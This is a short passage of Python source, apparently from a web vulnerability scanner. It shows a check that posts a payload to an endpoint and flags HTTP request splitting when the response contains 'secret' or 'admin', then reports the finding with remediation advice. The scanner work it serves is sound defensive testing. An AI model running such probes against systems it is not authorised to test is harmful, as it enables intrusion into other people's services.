            resp = await self._client.post(
                url,
                content=payload,
                headers={"Content-Type": "application/octet-stream"},
            )

            body = resp.text.lower()

            # Check if second request was processed
            if "secret" in body or "admin" in body:
                return SmugglingFinding(
                    category="request_splitting",
                    severity="critical",
                    title="HTTP Request Splitting",
                    description="Endpoint appears vulnerable to HTTP request splitting. "
                    "Multiple requests were processed from a single connection.",
                    endpoint=url,
                    payload=payload[:500],
                    evidence=f"Response: {resp.text[:500]}",
                    remediation="Validate and sanitize all HTTP headers. "
                    "Reject requests with multiple Host headers.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Request splitting test failed: {e}")

        return None
